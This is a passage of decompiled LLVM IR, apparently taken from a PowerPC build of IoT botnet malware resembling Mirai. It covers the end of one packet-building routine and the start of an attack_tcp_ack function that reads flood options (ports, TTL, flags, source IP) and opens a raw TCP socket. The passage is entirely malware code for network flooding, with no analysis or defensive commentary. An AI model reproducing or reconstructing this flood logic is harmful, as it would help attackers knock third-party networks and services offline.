dec_label_pc_100036e8:                            ; preds = %dec_label_pc_100036dc.dec_label_pc_100036e8_crit_edge, %dec_label_pc_10003574
  %v0_100036e8 = phi i32 [ %v0_100036e8.pre, %dec_label_pc_100036dc.dec_label_pc_100036e8_crit_edge ], [ %v4_10003568, %dec_label_pc_10003574 ]
  %v1_100036e8 = add i32 %v0_100036e8, 40
  store i32 %v1_100036e8, i32* @r29, align 4
  %v0_100036ec = load i32, i32* @r22, align 4
  store i32 %v0_100036ec, i32* @r4, align 4
  store i32 %v1_100036e8, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_100036f8.81 to i32), i32* @lr, align 4
  %v0_100036f4 = call i32 @rand_alphastr()
  store i32 %v0_100036f4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100036fc = load i32, i32* @r29, align 4
  %v2_100036fc = load i32, i32* @r22, align 4
  %v4_100036fc = add i32 %v2_100036fc, %v1_100036fc
  %v5_100036fc = inttoptr i32 %v4_100036fc to i8*
  store i8 0, i8* %v5_100036fc, align 1
  br label %dec_label_pc_10003578

dec_label_pc_10003704:                            ; preds = %dec_label_pc_1000367c
  %v3_10003704 = load i32, i32* %stack_var_-424, align 4
  store i32 %v3_10003704, i32* %r29.global-to-local, align 4
  store i32 %stack_var_-120.0, i32* %r9.global-to-local, align 4
  store i32 %v1_100033e8, i32* %r3.global-to-local, align 4
  %v1_10003710 = add i32 %stack_var_-120.0, 2
  %v2_10003710 = inttoptr i32 %v1_10003710 to i16*
  %v3_10003710 = load i16, i16* %v2_10003710, align 2
  %v4_10003710 = zext i16 %v3_10003710 to i32
  store i32 %v4_10003710, i32* %r11.global-to-local, align 4
  %v1_10003714 = mul i32 %v3_10003704, 16
  store i32 %v1_10003714, i32* %r9.global-to-local, align 4
  %v2_10003718 = load i32, i32* %r19.global-to-local, align 4
  %v3_10003718 = add i32 %v2_10003718, %v1_10003714
  %v4_10003718 = inttoptr i32 %v3_10003718 to i32*
  store i32 %tmp10, i32* %v4_10003718, align 4
  %v0_1000371c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000371c = load i32, i32* %r19.global-to-local, align 4
  %v2_1000371c = add i32 %v1_1000371c, %v0_1000371c
  store i32 %v2_1000371c, i32* %r9.global-to-local, align 4
  store i32 %stack_var_-120.0, i32* %r10.global-to-local, align 4
  %v0_10003724 = load i32, i32* %r29.global-to-local, align 4
  %v1_10003724 = mul i32 %v0_10003724, 4
  store i32 %v1_10003724, i32* %r29.global-to-local, align 4
  %v0_10003728 = load i32, i32* %r11.global-to-local, align 4
  %v1_10003728 = trunc i32 %v0_10003728 to i16
  %v3_10003728 = add i32 %v2_1000371c, 12
  %v4_10003728 = inttoptr i32 %v3_10003728 to i16*
  store i16 %v1_10003728, i16* %v4_10003728, align 2
  %v0_1000372c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000372c = add i32 %v0_1000372c, 4
  %v2_1000372c = inttoptr i32 %v1_1000372c to i32*
  %v3_1000372c = load i32, i32* %v2_1000372c, align 4
  store i32 %v3_1000372c, i32* %r0.global-to-local, align 4
  %v0_10003730 = load i32, i32* @r8, align 4
  %v1_10003730 = trunc i32 %v0_10003730 to i16
  %v2_10003730 = load i32, i32* %r9.global-to-local, align 4
  %v3_10003730 = add i32 %v2_10003730, 14
  %v4_10003730 = inttoptr i32 %v3_10003730 to i16*
  store i16 %v1_10003730, i16* %v4_10003730, align 2
  %v0_10003734 = load i32, i32* %r0.global-to-local, align 4
  %v1_10003734 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003734 = add i32 %v1_10003734, 4
  %v3_10003734 = inttoptr i32 %v2_10003734 to i32*
  store i32 %v0_10003734, i32* %v3_10003734, align 4
  %v0_10003738 = load i32, i32* %r10.global-to-local, align 4
  %v1_10003738 = add i32 %v0_10003738, 8
  %v2_10003738 = inttoptr i32 %v1_10003738 to i32*
  %v3_10003738 = load i32, i32* %v2_10003738, align 4
  store i32 %v3_10003738, i32* %r0.global-to-local, align 4
  %v1_1000373c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000373c = add i32 %v1_1000373c, 8
  %v3_1000373c = inttoptr i32 %v2_1000373c to i32*
  store i32 %v3_10003738, i32* %v3_1000373c, align 4
  store i32 268449604, i32* @lr, align 4
  %v1_10003740 = call i32 @malloc(i32 %v1_100033e8)
  store i32 %v1_10003740, i32* %r3.global-to-local, align 4
  %v3_10003744 = load i32, i32* %stack_var_-424, align 4
  store i32 %v3_10003744, i32* %r0.global-to-local, align 4
  %v1_10003748 = load i32, i32* @r29, align 4
  %v2_10003748 = load i32, i32* %r20.global-to-local, align 4
  %v3_10003748 = add i32 %v2_10003748, %v1_10003748
  %v4_10003748 = inttoptr i32 %v3_10003748 to i32*
  store i32 %v1_10003740, i32* %v4_10003748, align 4
  %v0_1000374c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000374c = mul i32 %v0_1000374c, 4
  store i32 %v1_1000374c, i32* %r0.global-to-local, align 4
  %v0_10003750 = load i32, i32* %r20.global-to-local, align 4
  %v2_10003750 = add i32 %v0_10003750, %v1_1000374c
  %v3_10003750 = inttoptr i32 %v2_10003750 to i32*
  %v4_10003750 = load i32, i32* %v3_10003750, align 4
  store i32 %v4_10003750, i32* %r10.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10003758 = inttoptr i32 %v4_10003750 to i32*
  %v2_10003758 = load i32, i32* %v1_10003758, align 4
  store i32 %v2_10003758, i32* %r9.global-to-local, align 4
  %v1_1000375c = add i32 %v4_10003750, 40
  store i32 %v1_1000375c, i32* @r29, align 4
  %v1_10003760 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10003760, i32* %r9.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_10003768 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  %v1_1000376c = load i32, i32* %r10.global-to-local, align 4
  %v2_1000376c = inttoptr i32 %v1_1000376c to i32*
  store i32 %v1_10003768, i32* %v2_1000376c, align 4
  store i32 %v4_10003774, i32* %r0.global-to-local, align 4
  %v2_10003778 = load i32, i32* %r10.global-to-local, align 4
  %v3_10003778 = add i32 %v2_10003778, 1
  %v4_10003778 = inttoptr i32 %v3_10003778 to i8*
  store i8 %v5_10003240, i8* %v4_10003778, align 1
  %v0_1000377c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000377c = add i32 %v0_1000377c, 20
  store i32 %v1_1000377c, i32* %r9.global-to-local, align 4
  %v0_10003780 = load i32, i32* %r0.global-to-local, align 4
  %v1_10003780 = trunc i32 %v0_10003780 to i16
  %v3_10003780 = add i32 %v0_1000377c, 4
  %v4_10003780 = inttoptr i32 %v3_10003780 to i16*
  store i16 %v1_10003780, i16* %v4_10003780, align 2
  store i32 %v1_100033e8, i32* %r11.global-to-local, align 4
  store i32 %v4_10003788, i32* %r0.global-to-local, align 4
  %v2_1000378c = load i32, i32* %r10.global-to-local, align 4
  %v3_1000378c = add i32 %v2_1000378c, 2
  %v4_1000378c = inttoptr i32 %v3_1000378c to i16*
  store i16 %v5_100033ec, i16* %v4_1000378c, align 2
  %v0_10003790 = load i32, i32* %r0.global-to-local, align 4
  %v1_10003790 = trunc i32 %v0_10003790 to i8
  %v2_10003790 = load i32, i32* %r10.global-to-local, align 4
  %v3_10003790 = add i32 %v2_10003790, 8
  %v4_10003790 = inttoptr i32 %v3_10003790 to i8*
  store i8 %v1_10003790, i8* %v4_10003790, align 1
  %v0_10003794 = load i32, i32* %r9.global-to-local, align 4
  %v0_10003798 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10003798, label %dec_label_pc_100037a4, label %dec_label_pc_1000379c

dec_label_pc_1000379c:                            ; preds = %dec_label_pc_10003704
  store i32 16384, i32* %r0.global-to-local, align 4
  %v2_100037a0 = load i32, i32* %r10.global-to-local, align 4
  %v3_100037a0 = add i32 %v2_100037a0, 6
  %v4_100037a0 = inttoptr i32 %v3_100037a0 to i16*
  store i16 16384, i16* %v4_100037a0, align 2
  br label %dec_label_pc_100037a4

dec_label_pc_100037a4:                            ; preds = %dec_label_pc_10003704, %dec_label_pc_1000379c
  store i32 268566528, i32* %r11.global-to-local, align 4
  %v2_100037ac = load i32, i32* %r10.global-to-local, align 4
  %v3_100037ac = add i32 %v2_100037ac, 9
  %v4_100037ac = inttoptr i32 %v3_100037ac to i8*
  store i8 6, i8* %v4_100037ac, align 1
  %v3_100037b0 = load i32, i32* @global_var_100211e0.76, align 4
  store i32 %v3_100037b0, i32* %r9.global-to-local, align 4
  %v1_100037b4 = load i32, i32* %r10.global-to-local, align 4
  %v2_100037b4 = add i32 %v1_100037b4, 12
  %v3_100037b4 = inttoptr i32 %v2_100037b4 to i32*
  store i32 %v3_100037b0, i32* %v3_100037b4, align 4
  %v3_100037b8 = load i32, i32* %stack_var_-424, align 4
  %v1_100037bc = mul i32 %v3_100037b8, 16
  store i32 %v1_100037bc, i32* %r0.global-to-local, align 4
  %v1_100037c0 = load i32, i32* %r19.global-to-local, align 4
  %v2_100037c0 = add i32 %v1_100037c0, %v1_100037bc
  store i32 %v2_100037c0, i32* %r8.global-to-local, align 4
  %v3_100037c4 = inttoptr i32 %v2_100037c0 to i32*
  %v4_100037c4 = load i32, i32* %v3_100037c4, align 4
  store i32 %v4_100037c4, i32* %r9.global-to-local, align 4
  %v1_100037c8 = add i32 %v2_100037c0, 12
  %v2_100037c8 = inttoptr i32 %v1_100037c8 to i16*
  %v3_100037c8 = load i16, i16* %v2_100037c8, align 2
  %v4_100037c8 = zext i16 %v3_100037c8 to i32
  store i32 %v4_100037c8, i32* %r11.global-to-local, align 4
  %v1_100037cc = load i32, i32* %r10.global-to-local, align 4
  %v2_100037cc = add i32 %v1_100037cc, 16
  %v3_100037cc = inttoptr i32 %v2_100037cc to i32*
  store i32 %v4_100037c4, i32* %v3_100037cc, align 4
  %v0_100037d0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100037d0 = trunc i32 %v0_100037d0 to i16
  %v2_100037d0 = load i32, i32* %r10.global-to-local, align 4
  %v3_100037d0 = add i32 %v2_100037d0, 20
  %v4_100037d0 = inttoptr i32 %v3_100037d0 to i16*
  store i16 %v1_100037d0, i16* %v4_100037d0, align 2
  store i32 1, i32* %r11.global-to-local, align 4
  store i32 %v0_10003794, i32* %r9.global-to-local, align 4
  %v0_100037dc = load i32, i32* %r8.global-to-local, align 4
  %v1_100037dc = add i32 %v0_100037dc, 8
  %v2_100037dc = inttoptr i32 %v1_100037dc to i32*
  %v3_100037dc = load i32, i32* %v2_100037dc, align 4
  store i32 %v3_100037dc, i32* %r10.global-to-local, align 4
  %v1_100037e0 = add i32 %v0_10003794, 12
  %v2_100037e0 = inttoptr i32 %v1_100037e0 to i32*
  %v3_100037e0 = load i32, i32* %v2_100037e0, align 4
  store i32 %v3_100037e0, i32* %r0.global-to-local, align 4
  %v2_100037e4 = add i32 %v0_10003794, 4
  %v3_100037e4 = inttoptr i32 %v2_100037e4 to i32*
  store i32 %v3_100037dc, i32* %v3_100037e4, align 4
  store i32 8, i32* %r9.global-to-local, align 4
  %v1_100037ec = call i32 @__asm_rlwimi(i32 8, i32 28, i32 0, i32 3)
  store i32 %v1_100037ec, i32* %r0.global-to-local, align 4
  %v0_100037f0 = load i32, i32* %r8.global-to-local, align 4
  %v1_100037f0 = add i32 %v0_100037f0, 14
  %v2_100037f0 = inttoptr i32 %v1_100037f0 to i16*
  %v3_100037f0 = load i16, i16* %v2_100037f0, align 2
  %v4_100037f0 = zext i16 %v3_100037f0 to i32
  store i32 %v4_100037f0, i32* %r9.global-to-local, align 4
  %v1_100037f4 = call i32 @__asm_rlwimi(i32 1, i32 16, i32 15, i32 15)
  store i32 %v1_100037f4, i32* %r0.global-to-local, align 4
  %v0_100037f8 = load i32, i32* %r8.global-to-local, align 4
  %v1_100037f8 = add i32 %v0_100037f8, 4
  %v2_100037f8 = inttoptr i32 %v1_100037f8 to i32*
  %v3_100037f8 = load i32, i32* %v2_100037f8, align 4
  store i32 %v3_100037f8, i32* %r10.global-to-local, align 4
  %v1_100037fc = call i32 @__asm_rlwimi(i32 1, i32 20, i32 11, i32 11)
  store i32 %v1_100037fc, i32* %r0.global-to-local, align 4
  store i32 %v0_10003794, i32* %r11.global-to-local, align 4
  %v0_10003804 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003804 = trunc i32 %v0_10003804 to i16
  %v3_10003804 = add i32 %v0_10003794, 2
  %v4_10003804 = inttoptr i32 %v3_10003804 to i16*
  store i16 %v1_10003804, i16* %v4_10003804, align 2
  %v0_10003808 = load i32, i32* %r10.global-to-local, align 4
  %v1_10003808 = load i32, i32* %r11.global-to-local, align 4
  %v2_10003808 = add i32 %v1_10003808, 8
  %v3_10003808 = inttoptr i32 %v2_10003808 to i32*
  store i32 %v0_10003808, i32* %v3_10003808, align 4
  %v1_1000380c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000380c = add i32 %v1_1000380c, 12
  %v3_1000380c = inttoptr i32 %v2_1000380c to i32*
  store i32 %v1_100037fc, i32* %v3_1000380c, align 4
  %v0_10003810 = call i32 @rand_next()
  %v1_10003810 = trunc i32 %v0_10003810 to i16
  store i32 %v0_10003794, i32* %r9.global-to-local, align 4
  store i32 %v1_100032c0, i32* %r10.global-to-local, align 4
  %v0_1000381c = load i32, i32* @r22, align 4
  store i32 %v0_1000381c, i32* @r4, align 4
  %v4_10003820 = add i32 %v0_10003794, 14
  %v5_10003820 = inttoptr i32 %v4_10003820 to i16*
  store i16 %v1_10003810, i16* %v5_10003820, align 2
  %v0_10003824 = load i32, i32* @r29, align 4
  store i32 %v0_10003824, i32* @r3, align 4
  store i32 %v1_100032dc, i32* %r11.global-to-local, align 4
  %v0_1000382c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000382c = add i32 %v0_1000382c, 12
  %v2_1000382c = inttoptr i32 %v1_1000382c to i32*
  %v3_1000382c = load i32, i32* %v2_1000382c, align 4
  store i32 %v3_1000382c, i32* %r0.global-to-local, align 4
  store i32 %v1_100032f8, i32* %r9.global-to-local, align 4
  %v1_10003834 = call i32 @__asm_rlwimi(i32 %v1_100032c0, i32 21, i32 10, i32 10)
  store i32 %v1_10003834, i32* %r0.global-to-local, align 4
  store i32 %v0_10003794, i32* %r10.global-to-local, align 4
  %v1_1000383c = call i32 @__asm_rlwimi(i32 %v1_100032dc, i32 20, i32 11, i32 11)
  store i32 %v1_1000383c, i32* %r0.global-to-local, align 4
  %v1_10003840 = call i32 @__asm_rlwimi(i32 %v1_100032f8, i32 19, i32 12, i32 12)
  store i32 %v1_10003840, i32* %r0.global-to-local, align 4
  %v1_10003844 = call i32 @__asm_rlwimi(i32 %v1_1000331c, i32 18, i32 13, i32 13)
  store i32 %v1_10003844, i32* %r0.global-to-local, align 4
  %v1_10003848 = call i32 @__asm_rlwimi(i32 %v1_10003334, i32 17, i32 14, i32 14)
  store i32 %v1_10003848, i32* %r0.global-to-local, align 4
  %v1_1000384c = call i32 @__asm_rlwimi(i32 %v1_1000334c, i32 16, i32 15, i32 15)
  store i32 %v1_1000384c, i32* %r0.global-to-local, align 4
  %v1_10003850 = load i32, i32* %r10.global-to-local, align 4
  %v2_10003850 = add i32 %v1_10003850, 12
  %v3_10003850 = inttoptr i32 %v2_10003850 to i32*
  store i32 %v1_1000384c, i32* %v3_10003850, align 4
  store i32 ptrtoint (i32* @global_var_10003858.82 to i32), i32* @lr, align 4
  %v0_10003854 = call i32 @rand_alphastr()
  store i32 %v0_10003854, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000385c = load i32, i32* @r29, align 4
  %v2_1000385c = load i32, i32* @r22, align 4
  %v4_1000385c = add i32 %v2_1000385c, %v1_1000385c
  %v5_1000385c = inttoptr i32 %v4_1000385c to i8*
  store i8 0, i8* %v5_1000385c, align 1
  br label %dec_label_pc_1000351c

; uselistorder directives
  uselistorder i32 %v2_100037c0, { 1, 0, 2 }
  uselistorder i32 %v1_100037bc, { 1, 0 }
  uselistorder i32 %v0_10003794, { 3, 2, 4, 6, 5, 0, 8, 7, 1 }
  uselistorder i32 %v1_1000374c, { 1, 0 }
  uselistorder i32 %v1_10003714, { 1, 0 }
  uselistorder i32 %v0_100036dc, { 1, 0 }
  uselistorder i32 %v0_100036c4, { 1, 0 }
  uselistorder i32 %v2_100036b8, { 1, 2, 0 }
  uselistorder i32 %v1_100035fc, { 1, 2, 3, 0 }
  uselistorder i32 %v4_100035c4, { 1, 0 }
  uselistorder i32 %v0_10003590, { 1, 0, 2 }
  uselistorder i32 %v2_10003584, { 1, 0 }
  uselistorder i32 %v1_10003560, { 1, 0 }
  uselistorder i32 %v1_10003544, { 1, 0, 2 }
  uselistorder i16 %storemerge, { 1, 0 }
  uselistorder i32 %stack_var_-412.1, { 1, 0 }
  uselistorder i32 %v3_1000369c, { 1, 3, 0, 2 }
  uselistorder i32 %stack_var_-120.0, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v4_10003774, { 1, 0 }
  uselistorder i32 %v1_10003680, { 1, 0 }
  uselistorder i32 %v1_100033e8, { 2, 1, 0, 3, 4 }
  uselistorder i16 %v5_100033cc, { 1, 0 }
  uselistorder i32 %v0_100033c4, { 1, 0 }
  uselistorder i32* %stack_var_-424, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32 %tmp10, { 1, 2, 0 }
  uselistorder i16 %tmp9, { 1, 0 }
  uselistorder i32 %tmp8, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 30, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32* %r0.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 39, 41, 42, 43, 44, 45, 46 }
  uselistorder i1* %cr4_eq.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder i1* %cr3_eq.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 1179648, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100037a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000361c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_10003578, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10003560, { 1, 0 }
  uselistorder label %dec_label_pc_1000351c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100034e8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10003418, { 1, 0 }
}

define i32 @attack_tcp_ack(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cr2_eq.global-to-local = alloca i1, align 1
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_10003864 = load i32, i32* @lr, align 4
  store i32 %v0_10003864, i32* %r0.global-to-local, align 4
  %v0_1000386c = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r17.global-to-local, align 4
  store i32 %v0_1000386c, i32* @r27, align 4
  %v0_10003880 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-136, align 4
  %v0_100038bc = load i32, i32* @r24, align 4
  %v0_100038c0 = load i32, i32* @r25, align 4
  %v0_100038c4 = load i32, i32* @r26, align 4
  store i32 %arg4, i32* @r28, align 4
  %v0_100038d0 = load i32, i32* @r29, align 4
  store i32 %arg5, i32* %r29.global-to-local, align 4
  store i32 268450024, i32* @lr, align 4
  %v2_100038e4 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_100038e8 = load i32, i32* @r29, align 4
  store i32 %v2_100038e4, i32* %r18.global-to-local, align 4
  %v0_100038f8 = load i32, i32* @r28, align 4
  store i32 %v0_100038f8, i32* %r3.global-to-local, align 4
  store i32 268450048, i32* @lr, align 4
  %v4_100038fc = inttoptr i32 %v0_100038e8 to i32*
  %v5_100038fc = call i32 @attack_get_opt_int(i32 %v0_100038f8, i32* %v4_100038fc, i32 2, i32 0)
  %v5_1000390c = trunc i32 %v5_100038fc to i8
  %v0_10003914 = load i32, i32* @r29, align 4
  %v0_10003918 = load i32, i32* @r28, align 4
  store i32 %v0_10003918, i32* %r3.global-to-local, align 4
  store i32 268450080, i32* @lr, align 4
  %v4_1000391c = inttoptr i32 %v0_10003914 to i32*
  %v5_1000391c = call i32 @attack_get_opt_int(i32 %v0_10003918, i32* %v4_1000391c, i32 3, i32 65535)
  %v0_10003920 = load i32, i32* @r29, align 4
  store i32 %v5_1000391c, i32* %r14.global-to-local, align 4
  %v0_10003930 = load i32, i32* @r28, align 4
  store i32 %v0_10003930, i32* %r3.global-to-local, align 4
  store i32 268450104, i32* @lr, align 4
  %v4_10003934 = inttoptr i32 %v0_10003920 to i32*
  %v5_10003934 = call i32 @attack_get_opt_int(i32 %v0_10003930, i32* %v4_10003934, i32 4, i32 64)
  %v0_10003938 = load i32, i32* @r29, align 4
  %v1_10003944 = urem i32 %v5_10003934, 256
  store i32 %v1_10003944, i32* %r20.global-to-local, align 4
  %v0_10003948 = load i32, i32* @r28, align 4
  store i32 %v0_10003948, i32* %r3.global-to-local, align 4
  store i32 268450128, i32* @lr, align 4
  %v4_1000394c = inttoptr i32 %v0_10003938 to i32*
  %v5_1000394c = call i32 @attack_get_opt_int(i32 %v0_10003948, i32* %v4_1000394c, i32 5, i32 0)
  %v1_10003954 = urem i32 %v5_1000394c, 256
  %v0_10003964 = load i32, i32* @r29, align 4
  %v0_10003968 = load i32, i32* @r28, align 4
  store i32 %v0_10003968, i32* %r3.global-to-local, align 4
  store i32 268450160, i32* @lr, align 4
  %v4_1000396c = inttoptr i32 %v0_10003964 to i32*
  %v5_1000396c = call i32 @attack_get_opt_int(i32 %v0_10003968, i32* %v4_1000396c, i32 6, i32 65535)
  %v0_10003974 = load i32, i32* @r29, align 4
  store i32 %v5_1000396c, i32* %r15.global-to-local, align 4
  %v0_10003984 = load i32, i32* @r28, align 4
  store i32 %v0_10003984, i32* %r3.global-to-local, align 4
  store i32 268450188, i32* @lr, align 4
  %v4_10003988 = inttoptr i32 %v0_10003974 to i32*
  %v5_10003988 = call i32 @attack_get_opt_int(i32 %v0_10003984, i32* %v4_10003988, i32 7, i32 65535)
  %v0_10003990 = load i32, i32* @r29, align 4
  store i32 %v5_10003988, i32* %r16.global-to-local, align 4
  %v0_100039a0 = load i32, i32* @r28, align 4
  store i32 %v0_100039a0, i32* %r3.global-to-local, align 4
  store i32 268450216, i32* @lr, align 4
  %v4_100039a4 = inttoptr i32 %v0_10003990 to i32*
  %v5_100039a4 = call i32 @attack_get_opt_int(i32 %v0_100039a0, i32* %v4_100039a4, i32 16, i32 65535)
  %v0_100039b0 = load i32, i32* @r29, align 4
  %v0_100039bc = load i32, i32* @r28, align 4
  store i32 %v0_100039bc, i32* %r3.global-to-local, align 4
  store i32 268450244, i32* @lr, align 4
  %v4_100039c0 = inttoptr i32 %v0_100039b0 to i32*
  %v5_100039c0 = call i32 @attack_get_opt_int(i32 %v0_100039bc, i32* %v4_100039c0, i32 17, i32 65535)
  %v0_100039c4 = load i32, i32* @r29, align 4
  %v0_100039d4 = load i32, i32* @r28, align 4
  store i32 %v0_100039d4, i32* %r3.global-to-local, align 4
  store i32 268450268, i32* @lr, align 4
  %v4_100039d8 = inttoptr i32 %v0_100039c4 to i32*
  %v5_100039d8 = call i32 @attack_get_opt_int(i32 %v0_100039d4, i32* %v4_100039d8, i32 10, i32 0)
  %v0_100039dc = load i32, i32* @r29, align 4
  store i32 %v5_100039d8, i32* %r21.global-to-local, align 4
  %v0_100039ec = load i32, i32* @r28, align 4
  store i32 %v0_100039ec, i32* %r3.global-to-local, align 4
  store i32 268450292, i32* @lr, align 4
  %v4_100039f0 = inttoptr i32 %v0_100039dc to i32*
  %v5_100039f0 = call i32 @attack_get_opt_int(i32 %v0_100039ec, i32* %v4_100039f0, i32 11, i32 1)
  %v0_100039f4 = load i32, i32* @r29, align 4
  store i32 %v5_100039f0, i32* %r22.global-to-local, align 4
  %v0_10003a04 = load i32, i32* @r28, align 4
  store i32 %v0_10003a04, i32* %r3.global-to-local, align 4
  store i32 268450316, i32* @lr, align 4
  %v4_10003a08 = inttoptr i32 %v0_100039f4 to i32*
  %v5_10003a08 = call i32 @attack_get_opt_int(i32 %v0_10003a04, i32* %v4_10003a08, i32 12, i32 0)
  %v0_10003a0c = load i32, i32* @r29, align 4
  store i32 %v5_10003a08, i32* %r23.global-to-local, align 4
  %v0_10003a1c = load i32, i32* @r28, align 4
  store i32 %v0_10003a1c, i32* %r3.global-to-local, align 4
  store i32 268450340, i32* @lr, align 4
  %v4_10003a20 = inttoptr i32 %v0_10003a0c to i32*
  %v5_10003a20 = call i32 @attack_get_opt_int(i32 %v0_10003a1c, i32* %v4_10003a20, i32 13, i32 0)
  %v0_10003a24 = load i32, i32* @r29, align 4
  store i32 %v5_10003a20, i32* %r24.global-to-local, align 4
  %v0_10003a34 = load i32, i32* @r28, align 4
  store i32 %v0_10003a34, i32* %r3.global-to-local, align 4
  store i32 268450364, i32* @lr, align 4
  %v4_10003a38 = inttoptr i32 %v0_10003a24 to i32*
  %v5_10003a38 = call i32 @attack_get_opt_int(i32 %v0_10003a34, i32* %v4_10003a38, i32 14, i32 0)
  %v0_10003a3c = load i32, i32* @r29, align 4
  store i32 %v5_10003a38, i32* %r25.global-to-local, align 4
  %v0_10003a4c = load i32, i32* @r28, align 4
  store i32 %v0_10003a4c, i32* %r3.global-to-local, align 4
  store i32 268450388, i32* @lr, align 4
  %v4_10003a50 = inttoptr i32 %v0_10003a3c to i32*
  %v5_10003a50 = call i32 @attack_get_opt_int(i32 %v0_10003a4c, i32* %v4_10003a50, i32 15, i32 0)
  %v0_10003a54 = load i32, i32* @r29, align 4
  store i32 %v5_10003a50, i32* %r26.global-to-local, align 4
  %v0_10003a64 = load i32, i32* @r28, align 4
  store i32 %v0_10003a64, i32* %r3.global-to-local, align 4
  store i32 268450412, i32* @lr, align 4
  %v4_10003a68 = inttoptr i32 %v0_10003a54 to i32*
  %v5_10003a68 = call i32 @attack_get_opt_int(i32 %v0_10003a64, i32* %v4_10003a68, i32 0, i32 512)
  %v0_10003a6c = load i32, i32* @r29, align 4
  store i32 %v5_10003a68, i32* @r30, align 4
  %v0_10003a7c = load i32, i32* @r28, align 4
  store i32 %v0_10003a7c, i32* %r3.global-to-local, align 4
  store i32 268450436, i32* @lr, align 4
  %v4_10003a80 = inttoptr i32 %v0_10003a6c to i32*
  %v5_10003a80 = call i32 @attack_get_opt_int(i32 %v0_10003a7c, i32* %v4_10003a80, i32 1, i32 1)
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_10003a88 = load i32, i32* @global_var_100211e0.76, align 4
  %v1_10003a8c = urem i32 %v5_10003a80, 256
  %v0_10003a90 = load i32, i32* @r29, align 4
  %v0_10003a9c = load i32, i32* @r28, align 4
  store i32 %v0_10003a9c, i32* %r3.global-to-local, align 4
  store i32 268450468, i32* @lr, align 4
  %v5_10003aa0 = inttoptr i32 %v0_10003a90 to i32*
  %v6_10003aa0 = call i32 @attack_get_opt_ip(i32 %v0_10003a9c, i32* %v5_10003aa0, i32 24, i32 %v3_10003a88, i32 268566528)
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10003aac = call i32 @__GI_time()
  %v1_10003ab4 = load i32, i32* @r27, align 4
  %v2_10003ab4 = add i32 %v1_10003ab4, %v0_10003aac
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268450504, i32* @lr, align 4
  %v3_10003ac4 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_10003ac4, i32* %r3.global-to-local, align 4
  %v3_10003ac8 = icmp eq i32 %v3_10003ac4, -1
  store i1 %v3_10003ac8, i1* %cr7_eq.global-to-local, align 1
  store i32 %v3_10003ac4, i32* %r19.global-to-local, align 4
  br i1 %v3_10003ac8, label %dec_label_pc_10003dc4, label %dec_label_pc_10003ad4

